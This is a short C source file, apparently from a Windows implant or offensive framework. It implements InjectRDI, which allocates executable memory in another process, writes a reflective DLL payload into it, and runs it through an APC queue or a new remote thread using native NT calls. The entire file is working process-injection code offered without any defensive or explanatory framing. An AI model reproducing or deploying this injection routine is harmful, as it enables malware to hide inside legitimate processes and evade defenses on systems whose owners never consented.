#include <windows.h>
#include <Common.h>
#include <Core/Win32.h>
#include <Core/Exec.h>

BOOL InjectRDI( _In_ HANDLE hProcess, _In_ HANDLE hThread, _In_ PBYTE pRDI, _In_ DWORD szRDI ){

    PVOID     pAddr      = NULL;
    ULONG     OldProtect = 0x00;
    ULONG_PTR Numberobw  = 0x00;
    NTSTATUS  Status     = 0x00;
    DWORD     SizeRDI    = szRDI;

	if ((Status = Instance->Api.pNtAllocateVirtualMemory(hProcess, &pAddr, 0, &SizeRDI, 0x3000, 0x40)) != 0) {
		return FALSE;
	}
	
    DEBUG("[I] Allocate memory at 0x%p", pAddr);

	if ((Status = Instance->Api.pNtWriteVirtualMemory(hProcess, pAddr, pRDI, szRDI, &Numberobw)) != 0 || Numberobw != szRDI) {
		return FALSE;
	}


	//if ((Status = Instance->Api.pNtProtectVirtualMemory(hProcess, &pAddr, &szRDI, 0x40, &OldProtect)) != 0) {
//		return FALSE;
	//}

#ifdef NtQueueApcThread
	if ((Status = Instance->Api.pNtQueueApcThread(hThread, pAddr, NULL, NULL, NULL)) != 0) {
		return FALSE;
	}
#endif

//#ifdef NtCreateThreadEx
    if ( (Status = Instance->Api.pNtCreateThreadEx( &hThread, NULL, NULL, hProcess, pAddr, NULL, NULL, NULL, NULL, NULL, NULL) ) ){
        return FALSE;
    }

    WaitForSingleObject(hThread,INFINITE);
//#endif

	return TRUE;

}